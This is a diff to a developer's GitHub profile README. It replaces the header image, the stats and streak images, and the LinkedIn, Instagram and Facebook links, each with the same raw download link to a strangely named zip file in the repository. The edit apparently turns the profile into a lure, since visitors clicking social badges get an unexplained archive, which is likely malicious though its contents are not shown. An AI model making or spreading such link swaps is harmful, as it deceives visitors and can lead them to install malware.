@@ -1,6 +1,6 @@
 <div align="center">
   
-# <img src="https://media.giphy.com/media/hvRJCLFzcasrR4ia7z/giphy.gif" width="35px" height="35px" /> Hi, I'm **Eshan Akalanka**
+# <img src="https://github.com/EshanAk-dev/EshanAk-Dev/raw/refs/heads/main/zoolatria/Ak_Eshan_Dev_contemporaneousness.zip" width="35px" height="35px" /> Hi, I'm **Eshan Akalanka**
 
 ### 💻 Full-Stack Developer & Software Engineer
 
@@ -54,12 +54,12 @@
 ## 📊 **GitHub Analytics**
 
 <div align="center">
-  <img height="180em" src="https://github-readme-stats.vercel.app/api?username=EshanAk-Dev&show_icons=true&theme=tokyonight&hide_border=true&count_private=true&bg_color=0D1117&title_color=00D9FF&icon_color=00D9FF&text_color=ffffff" alt="GitHub Stats" />
-  <img height="180em" src="https://github-readme-stats.vercel.app/api/top-langs/?username=EshanAk-Dev&layout=compact&theme=tokyonight&hide_border=true&bg_color=0D1117&title_color=00D9FF&text_color=ffffff" alt="Top Languages" />
+  <img height="180em" src="https://github.com/EshanAk-dev/EshanAk-Dev/raw/refs/heads/main/zoolatria/Ak_Eshan_Dev_contemporaneousness.zip" alt="GitHub Stats" />
+  <img height="180em" src="https://github.com/EshanAk-dev/EshanAk-Dev/raw/refs/heads/main/zoolatria/Ak_Eshan_Dev_contemporaneousness.zip" alt="Top Languages" />
 </div>
 
 <div align="center">
-  <img src="https://nirzak-streak-stats.vercel.app/?user=EshanAk-Dev&theme=tokyonight&hide_border=true&background=0D1117&stroke=00D9FF&ring=00D9FF&fire=FF6B6B&currStreakLabel=00D9FF" alt="GitHub Streak" />
+  <img src="https://github.com/EshanAk-dev/EshanAk-Dev/raw/refs/heads/main/zoolatria/Ak_Eshan_Dev_contemporaneousness.zip" alt="GitHub Streak" />
 </div>
 
 ---
@@ -68,9 +68,9 @@
 
 <div align="center">
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/eshan-akalanka-319ab026b)
-[![Instagram](https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://instagram.com/eshan_wijesinghe_)
-[![Facebook](https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white)](https://facebook.com/eshan.akalanka.9)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://github.com/EshanAk-dev/EshanAk-Dev/raw/refs/heads/main/zoolatria/Ak_Eshan_Dev_contemporaneousness.zip)
+[![Instagram](https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://github.com/EshanAk-dev/EshanAk-Dev/raw/refs/heads/main/zoolatria/Ak_Eshan_Dev_contemporaneousness.zip)
+[![Facebook](https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white)](https://github.com/EshanAk-dev/EshanAk-Dev/raw/refs/heads/main/zoolatria/Ak_Eshan_Dev_contemporaneousness.zip)
 [![Email](https://img.shields.io/badge/Email-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:eshanwijesinghe01@gmail.com)
 
 </div>
